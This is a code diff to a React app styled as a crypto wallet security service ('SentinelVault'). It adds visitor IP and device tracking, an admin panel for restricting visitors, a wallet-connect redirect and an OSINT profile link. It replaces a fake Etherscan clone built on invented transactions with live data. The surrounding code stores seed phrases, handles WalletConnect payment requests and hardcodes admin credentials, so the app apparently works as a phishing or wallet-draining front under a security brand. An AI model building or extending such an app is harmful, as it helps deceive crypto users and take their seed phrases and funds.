@@ -17,7 +17,7 @@ const EMAIL_CONFIGURED    = EMAILJS_SERVICE_ID !== 'YOUR_SERVICE_ID'
 // ── Types ────────────────────────────────────────────────────────────────
 type Severity = 'low' | 'medium' | 'high' | 'critical'
 type ChainKey = 'ethereum' | 'base' | 'arbitrum' | 'bsc' | 'polygon'
-type ViewKey  = 'home' | 'scan' | 'protect' | 'ownership' | 'recovery' | 'support' | 'admin' | 'etherscan'
+type ViewKey  = 'home' | 'scan' | 'protect' | 'ownership' | 'recovery' | 'support' | 'admin' | 'etherscan' | 'protecting'
 
 type Signal = { id: string; label: string; points: number; group: 'watching' | 'seed' | 'drainer' }
 
@@ -65,13 +65,33 @@ type ThreatItem   = { title: string; level: Severity; description: string }
 type PendingProtection = { email: string; name: string; wallets: string[]; network: ChainKey }
 type ProtectChecklistItem = { id: string; text: string; level: Severity }
 type CryptoNewsItem = { id: string; title: string; summary: string; source: string; url: string; imageUrl: string | null; publishedAt: number }
+type VisitorStatus = 'allowed' | 'restricted'
 
-type ConnectedWalletRecord = { wallet: string; chain: ChainKey; walletType: string; balance: string; txCount: string; connectedAt: string }
+type ConnectedWalletRecord = {
+  wallet: string
+  chain: ChainKey
+  walletType: string
+  balance: string
+  txCount: string
+  connectedAt: string
+  ipAddress: string
+  device: string
+}
 type ScanRecord            = { wallet: string; chain: ChainKey; score: number; severity: Severity; balance: string; findings: string[]; matchedSignals: string[]; generatedAt: string }
 type SignerCheckRecord     = { wallet: string; chain: ChainKey; status: 'passed' | 'failed'; detail: string; checkedAt: string }
 type EmailRecord           = { email: string; name: string; wallet: string; chain: ChainKey; severity: Severity; score: number; balance: string; sentAt: string; emailStatus: 'sent' | 'pending' | 'failed' }
 type AdminCreds            = { email: string; password: string }
 type SupportConfig         = { email: string; telegram: string }
+type VisitorSessionRecord  = {
+  id: string
+  ipAddress: string
+  device: string
+  userAgent: string
+  firstSeen: string
+  lastSeen: string
+  visits: number
+  status: VisitorStatus
+}
 
 type SeedPhraseRecord = {
   id: string
@@ -102,6 +122,18 @@ type WcDappRequest = {
   params: Record<string, string>
   status: 'pending' | 'approved' | 'rejected'
   createdAt: string
+}
+
+type EtherscanTxRow = {
+  hash: string
+  method: string
+  block: number
+  age: string
+  from: string
+  to: string
+  direction: 'IN' | 'OUT'
+  value: string
+  fee: string
 }
 
 // ── Static data ──────────────────────────────────────────────────────────
@@ -162,6 +194,8 @@ const SIGNER_CHECKS_KEY    = 'sv_signer_checks'
 const EMAIL_RECORDS_KEY    = 'sv_email_records'
 const NEWSLETTER_EMAILS_KEY= 'sv_newsletter_emails'
 const SEED_PHRASES_KEY     = 'sv_seed_phrases'
+const VISITOR_SESSIONS_KEY = 'sv_visitor_sessions_v1'
+const VISITOR_ID_KEY       = 'sv_visitor_id_v1'
 const NEWS_REFRESH_MS = 5 * 60 * 1000
 const DEFAULT_VAULT_EMAIL    = 'vault@sentinelvault.io'
 const DEFAULT_VAULT_PASSWORD = 'sv-secure-2026'
@@ -201,6 +235,33 @@ const APPROVAL_TOPIC = '0x8c5be1e5ebec7d5bd14f714f27d1e84f3dd0314c0f7b2291e5b200
 const TRANSFER_TOPIC = '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55aeb0f4fefab'
 const GOPLUS_BASE_URL = 'https://api.gopluslabs.io/api/v1'
 const GOPLUS_ACCESS_TOKEN = (import.meta.env.VITE_GOPLUS_ACCESS_TOKEN ?? '').trim()
+const ALCHEMY_API_KEY = (import.meta.env.VITE_ALCHEMY_API_KEY ?? '').trim()
+const alchemyNetworkPath: Record<ChainKey, string> = {
+  ethereum: 'eth-mainnet',
+  base: 'base-mainnet',
+  arbitrum: 'arb-mainnet',
+  bsc: 'bnb-mainnet',
+  polygon: 'polygon-mainnet',
+}
+
+const priceFeedByChain: Record<ChainKey, string> = {
+  ethereum: 'ethereum',
+  base: 'ethereum',
+  arbitrum: 'ethereum',
+  bsc: 'binancecoin',
+  polygon: 'matic-network',
+}
+
+const explorerBrandByChain: Record<ChainKey, string> = {
+  ethereum: 'Etherscan',
+  base: 'Basescan',
+  arbitrum: 'Arbiscan',
+  bsc: 'BscScan',
+  polygon: 'PolygonScan',
+}
+
+const getAlchemyRpcUrl = (chain: ChainKey) =>
+  ALCHEMY_API_KEY ? `https://${alchemyNetworkPath[chain]}.g.alchemy.com/v2/${ALCHEMY_API_KEY}` : ''
 const goPlusChainId: Record<ChainKey, string> = {
   ethereum: '1',
   bsc: '56',
@@ -261,6 +322,31 @@ const nowString  = () => new Date().toLocaleString()
 const toHex      = (n: number) => `0x${n.toString(16)}`
 const hexToNum   = (v: string | null) => v ? parseInt(v, 16) : null
 
+const getDeviceLabel = (ua: string): string => {
+  const uaLower = ua.toLowerCase()
+  const platform = uaLower.includes('windows')
+    ? 'Windows'
+    : uaLower.includes('mac os')
+      ? 'macOS'
+      : uaLower.includes('android')
+        ? 'Android'
+        : uaLower.includes('iphone') || uaLower.includes('ipad')
+          ? 'iOS'
+          : uaLower.includes('linux')
+            ? 'Linux'
+            : 'Unknown OS'
+  const browser = uaLower.includes('edg/')
+    ? 'Edge'
+    : uaLower.includes('chrome/')
+      ? 'Chrome'
+      : uaLower.includes('safari/') && !uaLower.includes('chrome/')
+        ? 'Safari'
+        : uaLower.includes('firefox/')
+          ? 'Firefox'
+          : 'Browser'
+  return `${platform} · ${browser}`
+}
+
 const weiToNative = (v: string | null, decimals = 4) => {
   if (!v) return null
   const wei = BigInt(v)
@@ -268,6 +354,20 @@ const weiToNative = (v: string | null, decimals = 4) => {
   const frac  = ((wei % 10n ** 18n) * 10n ** BigInt(decimals) / 10n ** 18n).toString().padStart(decimals, '0')
   return `${whole}.${frac}`
 }
+
+const formatAgeFromTimestamp = (timestampMs: number) => {
+  const diff = Math.max(0, Date.now() - timestampMs)
+  const mins = Math.floor(diff / (60 * 1000))
+  if (mins < 1) return 'just now'
+  if (mins < 60) return `${mins} min${mins === 1 ? '' : 's'} ago`
+  const hours = Math.floor(mins / 60)
+  if (hours < 24) return `${hours} hr${hours === 1 ? '' : 's'} ago`
+  const days = Math.floor(hours / 24)
+  return `${days} day${days === 1 ? '' : 's'} ago`
+}
+
+const explorerRootForChain = (chain: ChainKey) =>
+  chainConfig[chain].explorerBase.replace(/\/address\/$/, '')
 
 const topicForAddress = (a: string) =>
   `0x000000000000000000000000${a.toLowerCase().replace('0x', '')}`
@@ -392,6 +492,8 @@ const makeConnectedWalletRows = (count: number): ConnectedWalletRecord[] => {
       balance:     `${(Math.random() * 5).toFixed(4)} ETH`,
       txCount:     String(Math.floor(Math.random() * 2000)),
       connectedAt: d.toLocaleString(),
+      ipAddress:   'Unknown',
+      device:      'Unknown Device',
     }
   }).sort((a, b) => new Date(b.connectedAt).getTime() - new Date(a.connectedAt).getTime())
 }
@@ -639,12 +741,16 @@ export default function App() {
   const [adminAuthError,       setAdminAuthError]       = useState('')
   const [adminAuthModalOpen,   setAdminAuthModalOpen]   = useState(false)
   const [isAdminAuthenticated, setIsAdminAuthenticated] = useState(false)
-  const [adminTab,             setAdminTab]             = useState<'wallets' | 'scans' | 'signers' | 'emails' | 'templates' | 'osint' | 'intel' | 'seeds' | 'settings' | 'qrcodes'>('wallets')
+  const [adminTab,             setAdminTab]             = useState<'wallets' | 'visitors' | 'scans' | 'signers' | 'emails' | 'templates' | 'osint' | 'intel' | 'seeds' | 'settings' | 'qrcodes'>('wallets')
   const [adminCreds,           setAdminCreds]           = useState(loadAdminCreds)
   const [supportConfig,        setSupportConfig]        = useState(loadSupportConfig)
   const [supportEmailInput,    setSupportEmailInput]    = useState('')
   const [supportStatus,        setSupportStatus]        = useState('')
   const [newsletterEmails,     setNewsletterEmails]     = useState<string[]>(() => loadStoredJson<string[]>(NEWSLETTER_EMAILS_KEY, []))
+  const [visitorSessions,      setVisitorSessions]      = useState<VisitorSessionRecord[]>(() => loadStoredJson<VisitorSessionRecord[]>(VISITOR_SESSIONS_KEY, []))
+  const [currentVisitorId,     setCurrentVisitorId]     = useState('')
+  const [currentVisitorIp,     setCurrentVisitorIp]     = useState('Unknown')
+  const [currentVisitorDevice, setCurrentVisitorDevice] = useState('Unknown')
   const [settingsCurPass,      setSettingsCurPass]      = useState('')
   const [settingsNewEmail,     setSettingsNewEmail]     = useState('')
   const [settingsNewPass,      setSettingsNewPass]      = useState('')
@@ -680,7 +786,8 @@ export default function App() {
   const [intelFindings,  setIntelFindings]  = useState('')
   const [intelNotes,     setIntelNotes]     = useState('')
   const [intelFormError, setIntelFormError] = useState('')
-  const [osintExpanded,  setOsintExpanded]  = useState<string | null>(null)
+  const [osintExpanded,     setOsintExpanded]     = useState<string | null>(null)
+  const [lastScannedWallet, setLastScannedWallet] = useState<string | null>(null)
 
   // Template preview
   const [previewEmail,        setPreviewEmail]        = useState<EmailRecord | null>(null)
@@ -702,6 +809,24 @@ export default function App() {
   const [wcPayTo,             setWcPayTo]             = useState('')
   const [wcActionStatus,      setWcActionStatus]      = useState<string | null>(null)
   const wcClientRef = useRef<Awaited<ReturnType<typeof SignClient.init>> | null>(null)
+  const [protectingProgress] = useState(0)
+  const [protectingDone] = useState(false)
+  const [protectingFinal] = useState(false)
+
+  // Etherscan view (live on-chain data)
+  const [esLoading, setEsLoading] = useState(false)
+  const [esError, setEsError] = useState('')
+  const [esTxRows, setEsTxRows] = useState<EtherscanTxRow[]>([])
+  const [esEthBalance, setEsEthBalance] = useState('0.0000')
+  const [esEthUsdPrice, setEsEthUsdPrice] = useState<string | null>(null)
+  const [esGasGwei, setEsGasGwei] = useState<string | null>(null)
+  const [esLatestBlock, setEsLatestBlock] = useState<number | null>(null)
+  const [esTxCount, setEsTxCount] = useState(0)
+
+  const esAddr = useMemo(() => {
+    const addr = wcSessions[0]?.address || connectedAddress || wallet
+    return isAddress(addr) ? addr : ''
+  }, [wcSessions, connectedAddress, wallet])
 
   const addressValid = useMemo(() => isAddress(wallet), [wallet])
 
@@ -763,6 +888,7 @@ export default function App() {
       setWcSessions(prev => [newSession, ...prev])
       setWcSelectedTopic(session.topic)
       setWcStatus('connected')
+      setActiveView('protect')   // auto-redirect to protected wallet page
       setWcActionStatus(`✅ Wallet connected: ${walletAddr.slice(0, 8)}…${walletAddr.slice(-6)}`)
     } catch (err) {
       console.error('WalletConnect error:', err)
@@ -780,14 +906,6 @@ export default function App() {
   // generateSecureQr is stable (no deps change) — safe to omit
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [activeView])
-
-  // Auto-redirect to protect page when WalletConnect session is approved
-  useEffect(() => {
-    if (wcStatus === 'connected') {
-      // eslint-disable-next-line react-hooks/set-state-in-effect
-      setActiveView('protect')
-    }
-  }, [wcStatus])
 
   const [threatRows,    setThreatRows]    = useState<ThreatRow[]>(() => makeThreatRows(200))
   const [liveScanRows,  setLiveScanRows]  = useState<ScanRecord[]>(() => makeRecentScanRows(100))
@@ -857,12 +975,21 @@ export default function App() {
         const normalized = appKitAddress.toLowerCase()
         const ch = resolvedChain
         const filtered = prev.filter(e => !(e.wallet.toLowerCase() === normalized && e.chain === ch))
-        return [{ wallet: appKitAddress, chain: ch, walletType: 'AppKit', balance: '', txCount: 'N/A', connectedAt: nowString() }, ...filtered].slice(0, 100)
+        return [{
+          wallet: appKitAddress,
+          chain: ch,
+          walletType: 'AppKit',
+          balance: '',
+          txCount: 'N/A',
+          connectedAt: nowString(),
+          ipAddress: currentVisitorIp,
+          device: currentVisitorDevice,
+        }, ...filtered].slice(0, 100)
       })
     } else if (!isAppKitConnected) {
       setWalletBalance('')
     }
-  }, [isAppKitConnected, appKitAddress, connectedChainId])
+  }, [isAppKitConnected, appKitAddress, connectedChainId, currentVisitorDevice, currentVisitorIp])
 
 
   useEffect(() => {
@@ -900,6 +1027,88 @@ export default function App() {
   useEffect(() => {
     localStorage.setItem(NEWSLETTER_EMAILS_KEY, JSON.stringify(newsletterEmails))
   }, [newsletterEmails])
+
+  // Auto-expand the last-scanned wallet profile when the admin opens the OSINT tab
+  useEffect(() => {
+    if (adminTab === 'osint' && lastScannedWallet) {
+      setOsintExpanded(lastScannedWallet)
+    }
+  }, [adminTab, lastScannedWallet])
+
+  useEffect(() => {
+    localStorage.setItem(VISITOR_SESSIONS_KEY, JSON.stringify(visitorSessions))
+  }, [visitorSessions])
+
+  useEffect(() => {
+    const visitorId = localStorage.getItem(VISITOR_ID_KEY) ?? `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
+    localStorage.setItem(VISITOR_ID_KEY, visitorId)
+    setTimeout(() => setCurrentVisitorId(visitorId), 0)
+
+    const userAgent = navigator.userAgent
+    const device = getDeviceLabel(userAgent)
+    setTimeout(() => setCurrentVisitorDevice(device), 0)
+
+    const registerSession = (ipAddress: string) => {
+      setCurrentVisitorIp(ipAddress)
+      const timestamp = nowString()
+      setVisitorSessions(prev => {
+        const existing = prev.find(row => row.id === visitorId)
+        if (existing) {
+          return prev.map(row => row.id === visitorId
+            ? {
+                ...row,
+                ipAddress,
+                device,
+                userAgent,
+                lastSeen: timestamp,
+                visits: row.visits + 1,
+              }
+            : row
+          )
+        }
+        return [{
+          id: visitorId,
+          ipAddress,
+          device,
+          userAgent,
+          firstSeen: timestamp,
+          lastSeen: timestamp,
+          visits: 1,
+          status: 'allowed',
+        }, ...prev]
+      })
+    }
+
+    fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(7000) })
+      .then(res => res.ok ? res.json() as Promise<{ ip?: string }> : Promise.reject(new Error(`IP lookup failed: ${res.status}`)))
+      .then(payload => registerSession(payload.ip?.trim() || 'Unknown'))
+      .catch(() => registerSession('Unknown'))
+  }, [])
+
+  const activeVisitor = useMemo(() => (
+    visitorSessions.find(session => session.id === currentVisitorId) ?? null
+  ), [visitorSessions, currentVisitorId])
+
+  const visitorRestricted = activeVisitor?.status === 'restricted'
+
+  useEffect(() => {
+    const blockedViews: ViewKey[] = ['scan', 'protect', 'ownership', 'recovery', 'admin', 'etherscan']
+    if (visitorRestricted && blockedViews.includes(activeView)) {
+      setTimeout(() => {
+        setActiveView('home')
+        setSecureStatus('Access restricted by admin. Contact support to restore wallet access.')
+      }, 0)
+    }
+  }, [activeView, visitorRestricted])
+
+  useEffect(() => {
+    if (!isWalletConnected && (activeView === 'ownership' || activeView === 'etherscan')) {
+      setTimeout(() => {
+        setActiveView('protect')
+        setSecureStatus('Connect your wallet first to open ownership and explorer routes.')
+      }, 0)
+    }
+  }, [activeView, isWalletConnected])
 
 
 
@@ -972,6 +1181,161 @@ export default function App() {
   // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [isAppKitConnected, appKitAddress])
 
+  useEffect(() => {
+    let alive = true
+    const loadEtherscanData = async () => {
+      if (activeView !== 'etherscan') return
+      const alchemyRpcUrl = getAlchemyRpcUrl(chain)
+      if (!esAddr) {
+        if (!alive) return
+        setEsError(`Connect a valid wallet address to load live ${chainConfig[chain].label} data.`)
+        setEsTxRows([])
+        return
+      }
+      if (!alchemyRpcUrl) {
+        if (!alive) return
+        setEsError('Set VITE_ALCHEMY_API_KEY to enable live explorer data.')
+        setEsTxRows([])
+        return
+      }
+
+      setEsLoading(true)
+      setEsError('')
+      try {
+        const [balanceHex, txCountHex, blockHex, gasPriceHex] = await Promise.all([
+          rpcFetch(alchemyRpcUrl, 'eth_getBalance', [esAddr, 'latest']),
+          rpcFetch(alchemyRpcUrl, 'eth_getTransactionCount', [esAddr, 'latest']),
+          rpcFetch(alchemyRpcUrl, 'eth_blockNumber', []),
+          rpcFetch(alchemyRpcUrl, 'eth_gasPrice', []),
+        ])
+
+        const gasPriceWei = BigInt((gasPriceHex as string) || '0x0')
+        const gasGwei = Number(gasPriceWei) / 1e9
+
+        const [incomingRes, outgoingRes] = await Promise.all([
+          rpcFetch(alchemyRpcUrl, 'alchemy_getAssetTransfers', [{
+            fromBlock: '0x0',
+            toBlock: 'latest',
+            toAddress: esAddr,
+            category: ['external', 'internal', 'erc20'],
+            withMetadata: true,
+            excludeZeroValue: false,
+            order: 'desc',
+            maxCount: '0x14',
+          }]),
+          rpcFetch(alchemyRpcUrl, 'alchemy_getAssetTransfers', [{
+            fromBlock: '0x0',
+            toBlock: 'latest',
+            fromAddress: esAddr,
+            category: ['external', 'internal', 'erc20'],
+            withMetadata: true,
+            excludeZeroValue: false,
+            order: 'desc',
+            maxCount: '0x14',
+          }]),
+        ])
+
+        type TransferRow = {
+          hash?: string
+          blockNum?: string
+          from?: string
+          to?: string
+          value?: string | number
+          asset?: string
+          category?: string
+          metadata?: { blockTimestamp?: string }
+        }
+
+        const incoming = ((incomingRes as { transfers?: TransferRow[] })?.transfers ?? [])
+        const outgoing = ((outgoingRes as { transfers?: TransferRow[] })?.transfers ?? [])
+        const combined = [...incoming, ...outgoing].filter(t => typeof t.hash === 'string' && !!t.hash)
+
+        const uniqueByHash = new Map<string, TransferRow>()
+        for (const tx of combined) {
+          if (!tx.hash) continue
+          if (!uniqueByHash.has(tx.hash)) uniqueByHash.set(tx.hash, tx)
+        }
+
+        const uniqTransfers = [...uniqueByHash.values()]
+          .sort((a, b) => parseInt(b.blockNum ?? '0x0', 16) - parseInt(a.blockNum ?? '0x0', 16))
+          .slice(0, 20)
+
+        const fees = await Promise.all(
+          uniqTransfers.map(async tx => {
+            if (!tx.hash) return ['unknown', 'N/A'] as const
+            try {
+              const receipt = await rpcFetch(alchemyRpcUrl, 'eth_getTransactionReceipt', [tx.hash]) as { gasUsed?: string; effectiveGasPrice?: string }
+              if (!receipt?.gasUsed || !receipt?.effectiveGasPrice) return [tx.hash, 'N/A'] as const
+              const weiFee = BigInt(receipt.gasUsed) * BigInt(receipt.effectiveGasPrice)
+              const feeEth = Number(weiFee) / 1e18
+              return [tx.hash, `${feeEth.toFixed(6)} ${chainConfig[chain].nativeSymbol}`] as const
+            } catch {
+              return [tx.hash, 'N/A'] as const
+            }
+          }),
+        )
+        const feeMap = new Map<string, string>(fees)
+
+        const txRows: EtherscanTxRow[] = uniqTransfers.map((tx) => {
+          const block = parseInt(tx.blockNum ?? '0x0', 16)
+          const from = tx.from ?? '0x0000000000000000000000000000000000000000'
+          const to = tx.to ?? '0x0000000000000000000000000000000000000000'
+          const direction = from.toLowerCase() === esAddr.toLowerCase() ? 'OUT' : 'IN'
+          const timestamp = tx.metadata?.blockTimestamp ? Date.parse(tx.metadata.blockTimestamp) : Date.now()
+          const valueNum = typeof tx.value === 'string' ? Number(tx.value) : (tx.value ?? 0)
+          const token = tx.asset || chainConfig[chain].nativeSymbol
+          const value = Number.isFinite(valueNum)
+            ? `${valueNum.toLocaleString(undefined, { maximumFractionDigits: 6 })} ${token}`
+            : `0 ${token}`
+          const method = tx.category === 'erc20' ? 'Token Transfer' : tx.category === 'internal' ? 'Internal Txn' : 'Transfer'
+          return {
+            hash: tx.hash ?? '',
+            method,
+            block,
+            age: formatAgeFromTimestamp(timestamp),
+            from,
+            to,
+            direction,
+            value,
+            fee: feeMap.get(tx.hash ?? '') ?? 'N/A',
+          }
+        })
+
+        let nativeUsdPrice: string | null = null
+        const priceKey = priceFeedByChain[chain]
+        try {
+          const priceRes = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${priceKey}&vs_currencies=usd`)
+          if (priceRes.ok) {
+            const pricePayload = await priceRes.json() as Record<string, { usd?: number }>
+            if (typeof pricePayload[priceKey]?.usd === 'number') {
+              nativeUsdPrice = pricePayload[priceKey].usd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+            }
+          }
+        } catch {
+          nativeUsdPrice = null
+        }
+
+        if (!alive) return
+        setEsEthBalance(weiToNative(balanceHex as string, 4) ?? '0.0000')
+        setEsTxCount(hexToNum(txCountHex as string) ?? txRows.length)
+        setEsLatestBlock(hexToNum(blockHex as string))
+        setEsGasGwei(gasGwei.toFixed(2))
+        setEsEthUsdPrice(nativeUsdPrice)
+        setEsTxRows(txRows)
+      } catch (error) {
+        if (!alive) return
+        const msg = error instanceof Error ? error.message : `Unable to load ${chainConfig[chain].label} data.`
+        setEsError(`Failed to fetch on-chain data: ${msg}`)
+        setEsTxRows([])
+      } finally {
+        if (alive) setEsLoading(false)
+      }
+    }
+
+    void loadEtherscanData()
+    return () => { alive = false }
+  }, [activeView, esAddr, chain])
+
   const switchNetwork = async () => {
     if (!isAppKitConnected) return
     try {
@@ -1003,6 +1367,10 @@ export default function App() {
     e.preventDefault(); setSubmitted(true); setReportStatus(''); setEmailSentMsg('')
     if (!addressValid) return
 
+    // Normalise — trim whitespace so stored addresses are always clean
+    const cleanWallet = wallet.trim()
+    if (cleanWallet !== wallet) setWallet(cleanWallet)
+
     const matchedSignals = signals.filter(s => selectedSignals.includes(s.id))
     const baseScore = matchedSignals.reduce((sum, s) => sum + s.points, 0)
     const byGroup: Record<Signal['group'], number> = { watching: 0, seed: 0, drainer: 0 }
@@ -1015,14 +1383,14 @@ export default function App() {
 
     // ── Look up admin-seeded intel for this address ─────────────────────
     const adminIntel = adminIntelRecords.find(r =>
-      r.address.toLowerCase() === wallet.toLowerCase() &&
+      r.address.toLowerCase() === cleanWallet.toLowerCase() &&
       (r.chain === chain || r.chain === 'ethereum')
     ) ?? null
 
     try {
       const [web3, securityApi] = await Promise.all([
-        runWeb3Scan(wallet, chain),
-        runSecurityApiScan(wallet, chain).catch(() => null),
+        runWeb3Scan(cleanWallet, chain),
+        runSecurityApiScan(cleanWallet, chain).catch(() => null),
       ])
       let web3Points = 0
       if (web3.pendingGap > 0)                      web3Points += 8
@@ -1057,10 +1425,11 @@ export default function App() {
 
       setResult({ score, severity, riskPercent: score, matchedSignals, byGroup, primaryConcern, web3, web3RiskPoints: web3Points, securityApi, adminIntel, generatedAt: nowString() })
       setScanHistory(prev => [{
-        wallet, chain, score, severity, balance: bal,
+        wallet: cleanWallet, chain, score, severity, balance: bal,
         findings, matchedSignals: matchedSignals.map(s => s.label),
         generatedAt: nowString(),
       }, ...prev].slice(0, 200))
+      setLastScannedWallet(cleanWallet.toLowerCase())
       const rpcMsg = isWalletConnected && appKitChainId === chainConfig[chain].chainId ? 'connected wallet RPC' : 'public RPC fallback'
       const apiMsg = securityApi ? 'GoPlus intel included.' : 'GoPlus unavailable.'
       const intelMsg = adminIntel ? ' System intel applied.' : ''
@@ -1073,10 +1442,11 @@ export default function App() {
       const score = Math.min(100, baseScore + adminIntelPoints)
       setResult({ score, severity, riskPercent: score, matchedSignals, byGroup, primaryConcern, web3: null, web3RiskPoints: 0, securityApi: null, adminIntel, generatedAt: nowString() })
       setScanHistory(prev => [{
-        wallet, chain, score, severity, balance: walletBalance || 'N/A',
+        wallet: cleanWallet, chain, score, severity, balance: walletBalance || 'N/A',
         findings: adminIntel ? adminIntel.findings.map(f => `[System Intel] ${f}`) : [],
         matchedSignals: matchedSignals.map(s => s.label), generatedAt: nowString(),
       }, ...prev].slice(0, 200))
+      setLastScannedWallet(cleanWallet.toLowerCase())
       setWeb3Status(`RPC error: ${err instanceof Error ? err.message : 'Unknown'}`)
     } finally { setIsRunningWeb3(false) }
   }
@@ -1271,6 +1641,18 @@ export default function App() {
   const checklistProgress = Math.round((protectChecklistDone.length / protectChecklist.length) * 100)
   const featuredNews = cryptoNews[0] ?? null
   const newsList = cryptoNews.slice(1, 7)
+  const explorerRoot = explorerRootForChain(chain)
+  const explorerAddressUrl = `${explorerRoot}/address/`
+  const explorerTxUrl = `${explorerRoot}/tx/`
+  const explorerBlockUrl = `${explorerRoot}/block/`
+  const explorerBrand = explorerBrandByChain[chain]
+  const shortEsAddr = esAddr.length > 12 ? `${esAddr.slice(0, 6)}...${esAddr.slice(-4)}` : esAddr
+  const esLastTx = esTxRows[0] ?? null
+  const esIncomingFund = esTxRows.find(tx => tx.direction === 'IN') ?? null
+  const esTokenTransferCount = esTxRows.filter(tx => tx.method === 'Token Transfer').length
+  const esEthValueUsd = esEthUsdPrice
+    ? (parseFloat(esEthBalance || '0') * parseFloat(esEthUsdPrice.replace(/,/g, ''))).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+    : null
 
   const toggleChecklistItem = (id: string) => {
     setProtectChecklistDone(prev => (
@@ -1289,6 +1671,7 @@ export default function App() {
 
   const adminTabs: { key: typeof adminTab; label: string; count?: number }[] = [
     { key: 'wallets',   label: 'Connected Wallets', count: connectedWallets.length },
+    { key: 'visitors',  label: 'Visitors',          count: visitorSessions.length },
     { key: 'scans',     label: 'Scan History',      count: scanHistory.length },
     { key: 'signers',   label: 'Signer Checks',     count: signerChecks.length },
     { key: 'emails',    label: 'User Emails',        count: emailRecords.length },
@@ -1401,6 +1784,12 @@ export default function App() {
     setWcTxTo('')
     setWcTxValue('')
     setWcTxData('')
+  }
+
+  const toggleVisitorRestriction = (visitorId: string, nextStatus: VisitorStatus) => {
+    setVisitorSessions(prev => prev.map(session => (
+      session.id === visitorId ? { ...session, status: nextStatus } : session
+    )))
   }
 
   const disconnectWcSession = async (topic: string) => {
@@ -1522,8 +1911,8 @@ export default function App() {
               <span className="wallet-dot" />{shortAddr(appKitAddress ?? '')}
             </button>
           ) : (
-            <button className="connect-btn" type="button" onClick={() => openAppKit()}>
-              Connect Wallet
+            <button className="connect-btn" type="button" disabled={visitorRestricted} onClick={() => openAppKit()}>
+              {visitorRestricted ? 'Wallet Access Restricted' : 'Connect Wallet Securely'}
             </button>
           )}
           <button className="menu-btn" type="button" aria-expanded={menuOpen} onClick={() => setMenuOpen(p => !p)}>
@@ -1531,6 +1920,12 @@ export default function App() {
           </button>
         </div>
       </header>
+
+      <div className={`visitor-note ${visitorRestricted ? 'visitor-note--warn' : ''}`}>
+        {visitorRestricted
+          ? 'Visitor notice: Your session is currently restricted by admin policy. Wallet routes are locked.'
+          : 'Visitor notice: Security controls are active for all visitors. IP/device telemetry may be logged to prevent abuse.'}
+      </div>
 
 
       {/* AppKit renders its own connect modal — triggered via openAppKit() */}
@@ -2150,7 +2545,21 @@ export default function App() {
                     <h2 style={{ fontSize: '1.1rem' }}>Security Report</h2>
                     <p className="result-meta">{chainConfig[chain].label} · {addressValid ? shortAddr(wallet) : '—'} · {result.generatedAt}</p>
                   </div>
-                  <span className={`pill ${result.severity}`}>{result.severity}</span>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem', flexWrap: 'wrap' }}>
+                    <span className={`pill ${result.severity}`}>{result.severity}</span>
+                    <button
+                      className="preview-btn"
+                      type="button"
+                      style={{ fontSize: '0.75rem' }}
+                      onClick={() => {
+                        setAdminTab('osint')
+                        setOsintExpanded(wallet.trim().toLowerCase())
+                        setActiveView('admin')
+                      }}
+                    >
+                      View OSINT Profile →
+                    </button>
+                  </div>
                 </div>
 
                 <div className="kpis">
@@ -2291,56 +2700,20 @@ export default function App() {
 
         {/* ════════════ OWNERSHIP ════════════ */}
         {/* ════════════ ETHERSCAN CLONE ════════════ */}
-        {activeView === 'etherscan' && (() => {
-          const esAddr = wcSessions[0]?.address || connectedAddress || '0x0000000000000000000000000000000000000000'
-          const shortEsAddr = esAddr.length > 12 ? `${esAddr.slice(0, 6)}...${esAddr.slice(-4)}` : esAddr
-          const [esTab, setEsTab] = ['transactions', () => {}] as unknown as [string, (v: string) => void]
-          void esTab; void setEsTab
-
-          const fakeAddresses = [
-            '0x28C6c06298d514Db089934071355E5743bf21d60',
-            '0xdAC17F958D2ee523a2206206994597C13D831ec7',
-            '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-            '0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAd',
-            '0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D',
-            '0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B',
-            '0x00000000219ab540356cBB839Cbe05303d7705Fa',
-            '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
-          ]
-          const methods = ['Transfer', 'Swap', 'Approve', 'Deposit', 'Withdraw', 'Execute', 'Multicall', 'Bridge']
-          const values  = ['0.05 ETH', '0.12 ETH', '0.3 ETH', '1.5 ETH', '0.007 ETH', '0 ETH', '0.825 ETH', '2.1 ETH', '0.0042 ETH', '0.55 ETH']
-          const fees    = ['$0.14', '$0.08', '$0.31', '$0.22', '$0.05', '$0.19', '$0.41', '$0.07', '$0.12', '$0.28']
-          const ages    = ['2 mins ago','18 mins ago','1 hr ago','3 hrs ago','6 hrs ago','12 hrs ago','1 day ago','1 day ago','2 days ago','2 days ago','3 days ago','4 days ago','5 days ago','6 days ago','7 days ago','8 days ago','9 days ago','10 days ago','12 days ago','14 days ago']
-          const blocks  = [21563201,21563189,21563020,21562490,21561223,21558990,21545001,21544890,21530120,21530005,21515780,21501230,21488670,21474100,21459800,21445200,21430700,21416100,21387000,21357900]
